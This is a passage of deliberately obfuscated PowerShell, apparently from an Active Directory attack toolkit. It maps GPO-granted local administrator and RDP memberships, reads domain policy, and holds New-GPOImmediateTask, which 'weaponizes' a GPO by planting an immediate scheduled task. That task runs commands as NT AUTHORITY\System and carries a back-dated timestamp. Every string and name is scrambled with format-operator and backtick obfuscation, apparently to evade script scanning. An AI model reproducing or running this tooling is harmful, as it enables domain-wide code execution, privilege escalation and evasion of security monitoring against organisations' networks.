        [ValidateSet({"{0}{4}{2}{1}{3}" -f'A','nistrato','mi','rs','d'}, {"{0}{1}{3}{2}" -f'S-1-5','-','544','32-'}, 'RDP', {"{5}{2}{4}{0}{1}{3}" -f 't','op',' D',' Users','esk','Remote'}, {"{0}{2}{1}" -f'S','-32-555','-1-5'})]
        ${l`O`C`ALgrOUP} = ("{3}{2}{1}{0}"-f'ators','istr','min','Ad'),

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`omAiN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}" -f 'th','A','DSPa'})]
        [String]
        ${S`E`ARcHB`ASe},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{1}{2}{0}" -f'roller','ma','inCont','Do'})]
        [String]
        ${SE`RVer},

        [ValidateSet({"{1}{0}"-f'ase','B'}, {"{1}{2}{0}" -f'el','O','neLev'}, {"{1}{2}{0}"-f'ee','Su','btr'})]
        [String]
        ${SEA`R`C`HsCOpe} = ("{0}{1}" -f 'Subt','ree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${R`esU`lTPage`siZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${se`R`VeR`TImEL`IMIT},

        [Switch]
        ${t`O`MbsTONe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cred`E`NTiaL} =  (  gET-cHildIteM vARIaBLE:0DsQr).vaLUE::"EMP`Ty"
    )

    BEGIN {
        ${CoMm`oNAR`g`UMen`TS} = @{}
        if (${PSbOUnD`p`A`R`AMeT`erS}[("{0}{1}"-f 'Do','main')]) { ${CoM`MO`NaRgu`mE`Nts}[("{1}{0}"-f'ain','Dom')] = ${DOM`Ain} }
        if (${psb`OundP`A`R`AmEters}[("{1}{0}"-f 'ver','Ser')]) { ${C`O`Mm`oN`ArG`UmEnTs}[("{1}{0}"-f'er','Serv')] = ${SERV`er} }
        if (${P`sbOuNDPaRA`m`Et`ers}[("{0}{3}{1}{2}" -f'Se','h','Scope','arc')]) { ${co`m`Mon`ArG`UmEnTs}[("{3}{1}{2}{0}"-f'e','earchS','cop','S')] = ${sEArcHs`c`OpE} }
        if (${ps`B`O`UNdPAra`MetE`RS}[("{2}{0}{1}{3}"-f'sult','PageSiz','Re','e')]) { ${cOmm`O`NAr`Gum`eNTs}[("{0}{1}{2}"-f 'R','esultPageS','ize')] = ${ReSUltP`AGE`Si`zE} }
        if (${PSBou`N`Dp`ArAm`ETErs}[("{2}{1}{0}" -f'Limit','verTime','Ser')]) { ${cOMMON`A`R`GuM`entS}[("{3}{0}{1}{2}{4}"-f 'verTime','Lim','i','Ser','t')] = ${Serv`e`RtimEl`iM`IT} }
        if (${psB`o`UNdPa`RAmE`T`eRS}[("{1}{0}{2}" -f'b','Tom','stone')]) { ${cOmMoNar`gUM`EnTs}[("{2}{1}{0}" -f 'e','ombston','T')] = ${Tom`BST`oNE} }
        if (${pS`Boun`dPArAMe`Ters}[("{1}{2}{0}" -f'ential','Cre','d')]) { ${co`m`mONA`RgU`MEntS}[("{0}{1}{3}{2}" -f 'Cr','ed','ial','ent')] = ${C`RE`Dential} }
    }

    PROCESS {
        if (${p`SboU`ND`p`ARAm`Eters}[("{4}{2}{3}{0}{1}"-f'Ident','ity','ute','r','Comp')]) {
            ${c`OM`puTErS} = &("{3}{0}{1}{4}{2}" -f 'n','Co','er','Get-Domai','mput') @CommonArguments -Identity ${ComPUT`e`RIDENtI`TY} -Properties ("{2}{5}{6}{0}{7}{3}{1}{4}" -f 'inguishednam','hostn','d','ns','ame','i','st','e,d')

            if (-not ${co`M`putErS}) {
                throw ('[Get-D'+'o'+'m'+'ai'+'nGPOComputerLoca'+'lG'+'roupMapping] '+'Compute'+'r '+"$ComputerIdentity "+'n'+'ot '+'fou'+'nd. '+'Try'+' '+'a '+'ful'+'l'+'y '+'qualif'+'i'+'e'+'d '+'hos'+'t '+'nam'+'e.')
            }

            ForEach (${cO`mpU`TeR} in ${CO`mPU`T`ers}) {

                ${G`PoG`UIdS} = @()

                
                ${Dn} = ${CoMP`U`Ter}."dist`iNguiS`hE`d`NamE"
                ${ou`In`DeX} = ${dN}.("{1}{0}" -f 'ndexOf','I').Invoke('OU=')
                if (${oUi`ND`Ex} -gt 0) {
                    ${o`UnA`mE} = ${D`N}.("{1}{0}{2}"-f 'ubS','S','tring').Invoke(${oUI`Nd`ex})
                }
                if (${Ou`Na`me}) {
                    ${GP`O`gUIds} += &("{2}{1}{0}"-f'nOU','ai','Get-Dom') @CommonArguments -SearchBase ${OUN`A`Me} -LDAPFilter (("{2}{1}{0}" -f 'ink=*)','gpl','(')) | &("{1}{0}{2}{3}" -f 'rEach-Obje','Fo','c','t') {
                        &("{0}{1}{3}{2}"-f'Se','lect-St','ng','ri') -InputObject ${_}."Gpl`iNk" -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | &("{3}{1}{0}{4}{2}" -f 'bje','Each-O','t','For','c') {${_}."MA`T`ChEs" | &("{1}{3}{0}{2}"-f '-O','Sele','bject','ct') -ExpandProperty ("{0}{1}" -f 'V','alue') }
                    }
                }

                
                &("{3}{1}{0}{2}"-f 'Verbo','-','se','Write') "Enumerating the sitename for: $($Computer.dnshostname) "
                ${coMPU`T`e`Rs`ITE} = (&("{3}{6}{5}{4}{2}{0}{1}" -f 'te','Name','erSi','G','tComput','t-Ne','e') -ComputerName ${CO`m`PUTEr}."dnSho`St`NAmE")."S`Itena`ME"
                if (${coMPU`TE`RS`itE} -and (${c`O`MpuTE`RsiTE} -notmatch ("{0}{1}" -f'E','rror'))) {
                    ${GP`O`g`UiDS} += &("{3}{4}{2}{0}{1}" -f'inSit','e','-Doma','G','et') @CommonArguments -Identity ${co`Mpu`TerSITE} -LDAPFilter ("{0}{3}{1}{2}" -f '(','link','=*)','gp') | &("{0}{1}{2}{3}" -f'Fo','rEach','-Obj','ect') {
                        &("{2}{1}{0}{3}"-f't-St','ec','Sel','ring') -InputObject ${_}."Gp`lINK" -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | &("{3}{1}{2}{4}{0}"-f 'ject','o','rEa','F','ch-Ob') {${_}."mAtC`H`ES" | &("{0}{1}{2}" -f'Selec','t-Obj','ect') -ExpandProperty ("{0}{1}" -f'Valu','e') }
                    }
                }

                
                ${gP`o`GuidS} | &("{1}{3}{4}{2}{0}"-f 'roup','Ge','ocalG','t-Domai','nGPOL') @CommonArguments | &("{0}{1}{2}"-f'Sort-','Ob','ject') -Property ("{0}{1}"-f'G','POName') -Unique | &("{0}{1}{3}{2}" -f'Fo','rEach','t','-Objec') {
                    ${G`PO`gRouP} = ${_}

                    if(${G`pOgRO`Up}."g`RO`Up`membERS") {
                        ${G`po`MEmBErs} = ${g`po`G`Roup}."gr`oUp`MEM`BERS"
                    }
                    else {
                        ${gp`O`MeMBeRs} = ${gp`og`RoUp}."gr`oUPS`iD"
                    }

                    ${g`poM`EmbE`RS} | &("{1}{3}{2}{0}" -f'ject','F','rEach-Ob','o') {
                        ${OBJ`ECT} = &("{2}{0}{1}{3}"-f 'O','bjec','Get-Domain','t') @CommonArguments -Identity ${_}
                        ${Is`g`ROup} = @(("{1}{0}"-f'56','2684354'),("{3}{2}{0}{1}"-f'54','57','843','26'),("{1}{2}{0}{3}" -f '8','5','36','70912'),("{2}{1}{0}"-f'913','70','5368')) -contains ${o`Bj`ECT}."Sa`MAccO`UN`TTYPe"

                        ${gpocO`mPuTErL`OcALgro`UP`meMbeR} = &("{1}{0}{2}"-f'-Ob','New','ject') ("{2}{1}{0}"-f'ct','Obje','PS')
                        ${Gp`OC`O`mPUTerlOc`A`LGroupm`eMB`er} | &("{1}{0}{2}" -f'-M','Add','ember') ("{1}{2}{0}{3}"-f'p','No','te','roperty') ("{3}{2}{1}{0}" -f 'e','m','puterNa','Com') ${C`o`M`pUter}."dN`ShO`s`TNamE"
                        ${GpocoMPUter`LO`Ca`L`GROuPmE`MBEr} | &("{0}{1}{2}"-f'Ad','d-Membe','r') ("{1}{0}{2}"-f 'prop','Note','erty') ("{2}{3}{0}{1}" -f'j','ectName','O','b') ${Ob`je`cT}."saM`Ac`CO`UnTnAme"
                        ${GPocO`M`PU`Ter`L`OCalG`Rou`pMEm`BEr} | &("{2}{0}{1}" -f '-Mem','ber','Add') ("{1}{2}{0}"-f'rty','N','oteprope') ("{1}{2}{0}"-f 'tDN','Ob','jec') ${O`Bject}."dISTI`Ngu`Is`he`dNaMe"
                        ${gPO`COmPUTerl`ocal`g`ROUPmemBER} | &("{0}{1}{2}" -f'Add','-Mem','ber') ("{1}{0}{3}{2}"-f 'pr','Note','y','opert') ("{2}{1}{0}" -f 'D','bjectSI','O') ${_}
                        ${GPOco`MPuTerlOCA`L`GRoUpmem`B`Er} | &("{2}{1}{0}" -f 'er','b','Add-Mem') ("{2}{3}{1}{0}" -f'ty','roper','No','tep') ("{0}{2}{1}"-f'I','p','sGrou') ${IsG`R`OUP}
                        ${GPOco`mp`UtERlOCAl`g`RoUPmEMBER} | &("{2}{0}{1}" -f'em','ber','Add-M') ("{2}{0}{1}" -f 'te','property','No') ("{2}{0}{4}{1}{3}"-f'PODi','playNa','G','me','s') ${gPOg`R`oUp}."gpOdI`S`Pl`AynaMe"
                        ${g`POcOmpUtErLOCaL`groupME`M`B`er} | &("{1}{0}{2}" -f'-Memb','Add','er') ("{1}{2}{0}"-f'perty','N','otepro') ("{2}{1}{0}" -f 'id','POGu','G') ${g`P`ogRouP}."gP`OnA`me"
                        ${GPo`coMPU`T`ERL`oC`ALGRO`U`pme`mbeR} | &("{0}{1}{2}{3}" -f'A','dd','-Mem','ber') ("{0}{1}{2}{3}"-f 'Not','eprope','rt','y') ("{0}{2}{1}" -f'G','Path','PO') ${gpo`g`Roup}."gPo`P`Ath"
                        ${gpoCoMpUTER`L`O`CaLGrOu`PMEMBER} | &("{1}{3}{0}{2}" -f'embe','Ad','r','d-M') ("{2}{0}{3}{1}" -f'ope','y','Notepr','rt') ("{2}{0}{1}"-f'PO','Type','G') ${g`pO`GrOUP}."gP`oT`yPE"
                        ${GPo`cOMp`UT`ERLO`CaLGRO`Upm`EMbeR}."PsoB`J`Ect"."t`Y`PenamEs".("{1}{0}" -f'd','Ad').Invoke(("{6}{5}{8}{7}{3}{1}{2}{0}{4}"-f 'emb','puterLocalGrou','pM','GPOCom','er','w','Po','.','erView'))
                        ${g`POC`OMPuTERLoC`ALGroU`P`M`eMBer}
                    }
                }
            }
        }
    }
}


function g`ET`-DOMAin`PoLic`y`d`ATa {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{1}{0}{2}"-f 'd','l','Process','PSShou'}, '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(PoSiTIon = 0, vaLuEFROMPipElINe = ${T`Rue}, VALUEfrOMpiPElINeByPrOPeRtynAME = ${Tr`UE})]
        [Alias({"{0}{1}"-f 'Sou','rce'}, {"{1}{0}" -f'e','Nam'})]
        [String]
        ${poLI`cy} = ("{0}{1}" -f'Do','main'),

        [ValidateNotNullOrEmpty()]
        [String]
        ${do`Ma`IN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{3}{2}" -f'on','DomainC','oller','tr'})]
        [String]
        ${S`ERV`eR},

        [ValidateRange(1, 10000)]
        [Int]
        ${SeRv`ERtI`M`eLIM`It},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRE`DeNtI`Al} =  (gET-VAriABLe ('0dsq'+'R')  -va )::"EM`ptY"
    )

    BEGIN {
        ${sE`Ar`c`herARg`UMeNtS} = @{}
        if (${PSBOu`ND`ParAMe`TeRS}[("{0}{1}" -f 'S','erver')]) { ${sEArcH`E`RargU`mE`N`TS}[("{0}{1}" -f 'Serv','er')] = ${s`eRv`Er} }
        if (${PSBo`Un`DParaME`TErS}[("{1}{0}{4}{2}{3}"-f'erve','S','meLi','mit','rTi')]) { ${Sea`Rc`heR`A`RgumENts}[("{3}{4}{0}{1}{2}" -f'ime','Li','mit','S','erverT')] = ${seRVeR`TimElI`mIT} }
        if (${P`S`Bo`Undp`AraMEt`ERs}[("{1}{2}{0}"-f'ial','Crede','nt')]) { ${S`eAr`cHER`ARGU`meNtS}[("{2}{1}{0}"-f'ential','red','C')] = ${crEdeN`Ti`Al} }

        ${cO`NVer`T`Ar`GUmeNTS} = @{}
        if (${PsbouN`d`pAR`Am`eteRS}[("{1}{0}{2}"-f 'r','Se','ver')]) { ${C`onVeR`TArgUM`ENtS}[("{0}{1}" -f 'Se','rver')] = ${s`ERVer} }
        if (${PS`B`Oundp`ArA`mEtERS}[("{2}{1}{0}" -f 'dential','e','Cr')]) { ${Co`N`VeRtarG`UMen`Ts}[("{1}{0}{3}{2}"-f 't','Creden','al','i')] = ${creDE`NtI`Al} }
    }

    PROCESS {
        if (${pS`Boun`D`paRaMEte`RS}[("{1}{0}" -f'ain','Dom')]) {
            ${S`ea`RCh`ER`ArgumEntS}[("{0}{1}"-f 'Dom','ain')] = ${Doma`IN}
            ${cOnV`erTar`gU`mEn`Ts}[("{0}{2}{1}" -f 'Do','ain','m')] = ${D`oMAiN}
        }

        if (${Pol`ICY} -eq 'All') {
            ${se`Ar`CHeRA`RGUM`Ents}[("{1}{0}{2}" -f't','Iden','ity')] = '*'
        }
        elseif (${P`OL`ICY} -eq ("{1}{0}"-f'main','Do')) {
            ${se`ARCHE`R`ARGuMEntS}[("{2}{0}{1}"-f 'de','ntity','I')] = '{31B2F340-016D-11D2-945F-00C04FB984F9}'
        }
        elseif ((${PoL`i`cY} -eq ("{0}{2}{4}{1}{3}"-f'Doma','rolle','in','r','Cont')) -or (${pol`i`Cy} -eq 'DC')) {
            ${se`ArCHeRA`R`gUmeN`TS}[("{2}{0}{1}" -f 't','ity','Iden')] = '{6AC1786C-016F-11D2-945F-00C04FB984F9}'
        }
        else {
            ${se`A`R`ChE`R`ArguMentS}[("{0}{1}"-f'Iden','tity')] = ${P`oLICY}
        }

        ${G`pORE`SUlTs} = &("{1}{0}{2}"-f'nGP','Get-Domai','O') @SearcherArguments

        ForEach (${g`PO} in ${GP`O`ResULts}) {
            
            ${GP`T`TMpLpaTH} = ${g`Po}."gpCfiLeS`y`SPatH" + ((("{1}{7}{2}{10}{9}{5}{4}{3}{6}{11}{8}{0}"-f'inf','INtM','tMi','s NTINtSecEdi','dow','ftINtWin','tINtG','ACHINEIN','mpl.','oso','cr','ptT'))."REPL`A`Ce"('INt',[stRINg][ChAr]92))

            ${pARs`ea`RgS} =  @{
                ("{1}{0}{2}"-f'at','GptTmplP','h') = ${gp`Ttmplp`ATh}
                ("{2}{3}{1}{0}" -f 't','tObjec','Out','pu') = ${tR`UE}
            }
            if (${PSBou`Nd`PAr`A`ME`TeRs}[("{0}{1}{2}" -f 'Cre','dent','ial')]) { ${pAr`se`Ar`Gs}[("{3}{0}{2}{1}" -f 'ede','al','nti','Cr')] = ${cr`eDeNt`Ial} }

            
            &("{1}{2}{0}"-f 'pl','Get-Gpt','Tm') @ParseArgs | &("{1}{0}{2}" -f 'Each','For','-Object') {
                ${_} | &("{1}{2}{0}" -f 'r','Add-','Membe') ("{0}{2}{1}"-f 'N','perty','otepro') ("{0}{1}" -f'G','POName') ${G`Po}."na`me"
                ${_} | &("{1}{2}{0}" -f'er','Add-','Memb') ("{2}{1}{0}{3}"-f'epr','ot','N','operty') ("{2}{3}{0}{1}"-f 'y','Name','GP','ODispla') ${g`Po}."di`s`PLaYna`mE"
                ${_}
            }
        }
    }
}


function Ne`W`-G`PoimmED`IaTEt`A`sk {

    [CmdletBinding(DeFaULTpAraMEterseTnAMe = {"{0}{1}" -f 'Cr','eate'})]
    Param (

        [Parameter(paraMeTerseTName = "cR`ea`TE", MANdatorY = ${tR`UE})]
        [Parameter(pArAMetERsetnAME = "rEmo`VE", ManDAtOrY = ${tR`Ue})]
        [String]
        [ValidateNotNullOrEmpty()]
        ${TA`skN`Ame},

        [Parameter(paraMEtErsETNamE = "C`ReAte")]
        [String]
        [ValidateNotNullOrEmpty()]
        ${com`mA`Nd} = ("{2}{0}{1}" -f'owers','hell','p'),

        [Parameter(pARaMEtErSEtname = "C`Rea`Te")]
        [String]
        [ValidateNotNullOrEmpty()]
        ${CoMmanD`ArgUM`E`Nts},

        [Parameter(paraMeterseTNaMe = "cREA`Te")]
        [String]
        [ValidateNotNullOrEmpty()]
        ${Ta`S`kD`ESCr`iptION} = '',

        [Parameter(ParAMetErSETNAmE = "CRE`A`TE")]
        [String]
        [ValidateNotNullOrEmpty()]
        ${taskau`TH`Or} = ((("{0}{1}{2}{3}" -f'NT AU','THOR','ITY','7qQSystem'))."RePLA`Ce"('7qQ',[sTRING][CHar]92)),

        [Parameter(PaRameTeRseTNAMe = "cRe`ATe")]
        [String]
        [ValidateNotNullOrEmpty()]
        ${Task`R`UN`AS} = ((("{1}{3}{2}{4}{0}" -f 'ystem','NT AUTHO','Y9LD','RIT','S'))."r`E`place"('9LD',[StrING][ChAR]92)),

        [Parameter(paRameteRSetnAme = "cr`eA`TE")]
        [String]
        [ValidateNotNullOrEmpty()]
        ${TaSK`LogO`NtY`pE} = 'S4U',

        [Parameter(PArAmetErSETnaME = "CRE`ATE")]
        [String]
        [ValidateNotNullOrEmpty()]
        ${T`AskrUNl`e`V`El} = ("{3}{4}{1}{2}{0}"-f 'le','ai','lab','Hig','hestAv'),

        [Parameter(pAramEteRsETnaME = "c`REaTe")]
        [String]
        [ValidateNotNullOrEmpty()]
        ${tAsK`moD`I`FIEDDATE} = (&("{0}{1}{2}"-f 'Get-','Dat','e') (&("{1}{0}{2}"-f'a','Get-D','te')).("{0}{1}" -f'AddDay','s').Invoke(-30) -Format ('u')).("{0}{1}" -f 't','rim').Invoke("Z"),

        [Parameter(ParamEtersETNAme = "CRe`AtE")]
        [String]
        [ValidateNotNullOrEmpty()]
        ${T`A`SkgUId} =  $zH701::("{1}{2}{0}"-f 'd','N','ewGui').Invoke(),

        [Parameter(pARAmETeRseTname = "CrE`ATE")]
        [Parameter(PARaMetERsetnAmE = "remO`VE")]
        [String]
        ${g`PO},

        [Parameter(pARAMeTeRSEtnAmE = "Crea`Te")]
        [Parameter(parAMeTersetnAmE = "RE`MovE")]
        [ValidateSet({"{0}{2}{1}"-f'M','chine','a'},{"{1}{0}"-f 'r','Use'})]
        [String]
        ${TaRG`ET} = ("{0}{1}" -f 'Machin','e'),

        [Parameter(ParameTeRseTnAMe = "cREa`TE")]
        [Parameter(pArAMEtERSEtName = "RE`m`OVe")]
        [String]
        ${dom`AIn},

        [Parameter(pARAmeTerseTNAME = "cR`eAtE")]
        [Parameter(PaRAmEtersEtnAmE = "REmO`VE")]
        [Management.Automation.PSCredential]
        ${C`R`EdEnTiAl},

        [Parameter(PARamEterSETNaMe = "cRE`ATe")]
        [Parameter(parAMeTeRseTnAme = "re`moVE")]
        ${ld`AP`Fi`LTER},

        [Parameter(pARAmETerSETNAMe = "c`ReATE")]
        [Parameter(paraMEtErseTName = "rEm`o`VE")]
        [String]
        ${seA`Rc`hBA`Se},

        [Parameter(pArAMeTErSEtnaMe = "CrEA`TE")]
        [Parameter(PARAMEteRsEtname = "R`EMOVE")]
        [String]
        ${sE`R`VeR},

        [Parameter(ParameTeRsEtnAMe = "cR`eaTE")]
        [Parameter(PArAmETeRSeTnAme = "R`EmoVE")]
        [String]
        ${sEa`RCH`Sco`pE},

        [Parameter(ParAmETerSEtnAME = "Cr`eate")]
        [Parameter(parAmETErSETnamE = "rE`Mo`VE")]
        [String]
        ${S`eRve`RtImE`lIMiT},

        [Parameter(pARaMetersetnamE = "C`ReATe")]
        [Parameter(paRamEterseTNaME = "re`mOve")]
        [Switch]
        ${FOr`ce},

        [Parameter(PArAMEtErseTname = "rE`mOVe")]
        [Switch]
        ${REM`ovE}
    )

    BEGIN {
        ${SEarCH`E`RArgUm`E`NTs} = @{}
        if (${pS`BouNdPAR`A`meTeRs}['GPO']) { ${SeAR`Che`R`ArGuMEN`TS}[("{0}{1}{2}"-f 'Id','ent','ity')] = ${G`Po} }
        if (${p`SbouN`dpa`RAm`eTe`Rs}[("{1}{0}"-f 'omain','D')]) { ${se`ARCheR`ARGumE`N`TS}[("{0}{1}"-f 'Do','main')] = ${DO`mA`iN} }
        if (${PS`BoU`NdPArAm`e`Te`RS}[("{2}{1}{0}"-f 'Base','ch','Sear')]) { ${S`eARcHerarguM`E`NtS}[("{1}{2}{0}" -f'Base','Sea','rch')] = ${SEaRC`h`B`ASe} }
        if (${p`SBo`UN`dPaRaMETErS}[("{0}{1}{2}"-f 'C','redenti','al')]) { ${s`EArC`H`ERARguMEn`TS}[("{0}{2}{1}{3}" -f'C','d','re','ential')] = ${Cr`edeN`T`IAL} }
        if (${ps`BOUnDp`ARa`METERs}[("{2}{1}{3}{0}" -f'er','PFil','LDA','t')]) { ${seaRchErA`Rgu`Me`Nts}[("{1}{2}{0}" -f 'er','LDAP','Filt')] = ${Dom`AIn} }
        if (${pSbO`U`Nd`P`ArA`mETERs}[("{0}{1}" -f'Ser','ver')]) { ${SEa`RCHe`RArgUmE`NtS}[("{1}{2}{0}"-f'er','Se','rv')] = ${se`R`Ver} }
        if (${p`Sb`oUN`dpAraMETErS}[("{0}{1}{2}"-f 'SearchS','cop','e')]) { ${SE`A`Rc`HERAR`G`UMeNTS}[("{3}{1}{0}{2}"-f'chSco','ar','pe','Se')] = ${SE`ArchS`cO`pe} }
        if (${p`SbO`UNdPArAm`E`T`ers}[("{1}{0}{3}{2}{4}" -f'e','Serv','imeL','rT','imit')]) { ${SEaR`C`H`eRArGum`EnTs}[("{1}{3}{2}{0}" -f 'meLimit','Se','Ti','rver')] = ${ser`V`E`R`TiMelI`mIt} }
    }

    PROCESS {
        
        ${G`PoS} = &("{0}{3}{2}{4}{1}" -f 'Ge','mainGPO','-D','t','o') @SearcherArguments -Raw

        if(!${g`POS}) {
            &("{4}{3}{0}{2}{1}" -f'a','g','rnin','ite-W','Wr') ("{7}{2}{3}{1}{6}{0}{4}{5}" -f'iateT','Imm','w-','GPO','ask] No GPO fou','nd.','ed','[Ne')
            return
        }

        ForEach(${gP`o`RAW} in ${Gp`os}) {
            ${G`P`OeNT`RY} = ${gp`oraW}.("{1}{2}{3}{0}" -f 'Entry','G','etD','irectory').Invoke()
            ${P`RocE`SSEdgp`oNa`mE} = ${Gpo`e`NTRy}."N`AME"
            &("{1}{0}{2}"-f 'e-Ver','Writ','bose') ('[New'+'-GPOI'+'mmedia'+'teTask'+'] '+'T'+'ry'+'ing '+'to'+' '+'wea'+'p'+'onize '+'GP'+'O: '+"$ProcessedGPOName")

            ${taSk`pA`Th} = &("{2}{1}{0}"-f 'th','Pa','Join-') ${gPO`e`NtRy}."GP`C`FILEs`YS`paTh" "\$Target\Preferences\ScheduledTasks\"
            ${tASKXML`pA`Th} = &("{2}{0}{1}"-f'at','h','Join-P') ${TA`SkP`ATh} ((("{0}{1}{2}{3}"-f '{','0}Sc','h','eduledTasks.xml'))-f[cHAR]92)

            if(${REmo`VE}) {
                if (!${FOr`CE} -and !${P`sCm`dleT}.("{4}{1}{0}{3}{2}" -f'C','d','ue','ontin','Shoul').Invoke(("{1}{4}{0}{6}{2}{5}{3}"-f 'o','D','want','e?','o y',' to continu','u '),('R'+'emovi'+'ng '+'s'+'chtask'+' '+'a'+'t '+"$TaskXMLPath"))) {
                    return
                }

                if (&("{0}{2}{1}" -f'Tes','ath','t-P') ${TaSkx`MLpA`Th}) {
                    
                    ${T`Askx`mL} = [xml](&("{1}{2}{0}"-f 'nt','G','et-Conte') -Path ${Task`Xm`l`PATH} -Encoding ("{1}{0}"-f'CII','AS'))
                    ${OLD`i`MMeDIaTEt`AskS} = ${tA`s`KXml}."s`Ch`eDUlEdtAsKS"."I`mmE`DiAtEtA`s`Kv2" | &("{0}{1}" -f'whe','re') ("{1}{0}"-f 'ame','n') -eq ${TaS`kN`AMe}
                    ForEach (${oLd`ImmE`D`IaTE`TAsk} in ${OLdIMMED`iate`T`A`SKs}) {
                        ${nu`lL} = ${ta`Sk`XMl}."ScheduL`ed`TasKs".("{0}{3}{1}{2}"-f'Remov','hil','d','eC').Invoke(${oLdimm`ed`I`At`EtASk})
                    }
                    ${TA`SKX`mL}.("{0}{1}" -f'Sav','e').Invoke(${tAskX`ML`pAtH})

                    if (${T`As`KxMl}."S`cheDu`LeDtaSks"."C`HI`LdnodeS"."COu`NT" -eq 0) {
                        &("{2}{3}{1}{0}" -f 'm','e','Re','move-It') -Path ${t`AS`KXmLPAth} -Force

                        
                        
                        if (${T`ArGet} -eq ("{1}{0}" -f'ne','Machi')) {
                            ${EXTENS`ion`N`A`meS} = ("{3}{0}{1}{2}{4}" -f 'Mac','hineEx','tension','gPC','Names')
                        } else {
                            ${e`xte`NS`ioNnA`mEs} = ("{4}{6}{1}{0}{5}{3}{2}" -f's','ten','nNames','o','gPCUser','i','Ex')
                        }

                        ${ZERO`gU`id} = ("{2}{3}{5}{1}{4}{0}{6}"-f '0000000','-','00000000','-0000-0','0000-00','000','000')
                        ${SChE`DuL`eD`TaSks`C`SEGUiD} = ("{4}{6}{5}{9}{10}{7}{8}{3}{2}{0}{1}" -f'C7','2','A4D1AF','4','C','455','AB5','-8','17E-ED','2-DEEA-4','691')
                        ${SC`HeDUL`eDTaSkS`TeGu`id} = ("{4}{9}{1}{10}{6}{5}{8}{0}{7}{3}{2}" -f'D','64-746C-','7','134904652','AADCE','3-A97','63','6','C-','D','4')

                        if (${g`Po`ENTRY}."pr`O`PERTIEs"[${exTENsio`NN`AM`eS}] -and ${gpO`E`NTRY}."pRO`P`Ert`ieS"[${ext`e`NsI`oNN`AmES}]."Va`LUE".("{2}{0}{1}" -f 'in','g','ToStr').Invoke().("{1}{0}{2}" -f 'on','C','tains').Invoke(${ScH`e`dULE`DTASK`s`CSEGuID})) {
                            ${o`LDe`xT`ENSio`NN`AmEs} = ${g`p`O`Entry}."P`ROPErTi`ES"[${e`XteNSiO`NNAM`es}]."vAL`UE".("{1}{0}{2}"-f't','ToS','ring').Invoke()
                            ${olDG`Ui`Ds`p`Lit} = ${oLdexten`SI`ONNam`Es}."SPl`IT"('][', $O7y::"reM`OVEeM`p`TYE`Ntr`iES")

                            ${OL`Dg`UIDs} = &("{0}{2}{1}{3}" -f 'New-','bjec','O','t') ("{2}{4}{6}{3}{1}{0}{5}"-f'ns.ArrayLis','ollectio','Sy','C','ste','t','m.')
                            ForEach (${gu`ids} in ${O`LDGUI`DSPLiT}) {
                                ${GuI`dS} = ${Gu`iDS}."sP`Lit"("}{",  ( gCI  ('V'+'aRiaBLe'+':o7'+'Y') ).valUE::"re`mOvE`E`mp`TyeNt`RIEs") -replace "[\{\[\]]", ""
                                ${Ol`Dguid} = &("{0}{2}{1}"-f'New-','t','Objec') ("{0}{6}{3}{2}{5}{7}{4}{1}"-f 'Syst','t','c','lle','s','tions','em.Co','.ArrayLi')(,${Gu`iDS})
                                ${nU`LL} = ${ol`dgu`i`Ds}.("{1}{0}"-f 'd','Ad').Invoke(${Old`gU`ID})
                            }

                            ${ne`Wg`UidS} = &("{1}{0}{2}" -f'bjec','New-O','t') ("{2}{3}{1}{7}{5}{8}{6}{0}{4}"-f's','llection','S','ystem.Co','t','r','Li','s.A','ray')

                            ForEach (${OldG`U`ID} in ${Old`G`UI`dS}) {
                                
                                if (${O`Ld`GuID}.("{2}{1}{0}" -f 'tains','on','C').Invoke(${z`ERO`guid}) -and ${o`Ld`GUiD}.("{0}{1}{2}" -f'C','ontain','s').Invoke(${SChEdUl`EdT`ASk`S`cSe`GUId})) {
                                    ${N`UlL} = ${Ol`Dg`Uid}.("{0}{1}"-f'Remo','ve').Invoke(${S`CHEdu`L`eD`TasKScSeg`Uid})
                                    if (${O`ldg`UiD}."cou`Nt" -gt 1) {
                                        ${o`ldGuID} = ${OLdG`U`ID} | &("{2}{1}{0}"-f 'ject','-Ob','Sort')
                                        ${NU`lL} = ${nE`W`gUIDS}.("{0}{1}" -f'A','dd').Invoke(${OldG`U`id})
                                    }
                                
                                } elseif (!(${OL`DgU`Id}.("{1}{0}{2}" -f'onta','C','ins').Invoke(${sc`He`Du`lEd`TA`sKste`GUiD}) -and ${old`g`UiD}.("{0}{2}{1}" -f'Cont','ins','a').Invoke(${s`cHe`dULEdTaSK`ScSegUiD}))) {
                                    ${n`ULL} = ${nEWG`Ui`dS}.("{0}{1}"-f 'A','dd').Invoke(${O`ldgu`ID})
                                }
                            }

                            if (${NewG`UI`Ds}."c`oUNt" -gt 0) {
                                ${New`gUI`Ds} = ${nEwG`Uids} | &("{0}{1}{2}"-f'Sor','t-Obje','ct')

                                
                                ${fo`RMATeDgu`I`ds} = &("{2}{0}{1}"-f '-Obj','ect','New') ("{6}{2}{7}{4}{5}{3}{1}{0}"-f 'st','Li','m.','ay','s.','Arr','Syste','Collection')
                                ForEach (${gUi`Ds} in ${n`e`WGUi`dS}) {
                                    ${fOrM`AT`EDGu`iD} = ""
                                    ForEach (${g`UiD} in ${GuI`DS}) {
                                        ${FoRM`AtEdg`UId} += "{"+${gu`iD}+"}"
                                    }
                                    ${F`ormA`TedgU`Id} = "["+${foRm`AT`e`DgUiD}+"]"
                                    ${N`UlL} = ${fO`Rm`At`EDgUI`ds}.("{1}{0}" -f'd','Ad').Invoke(${fO`RmAteD`GuId})
                                }
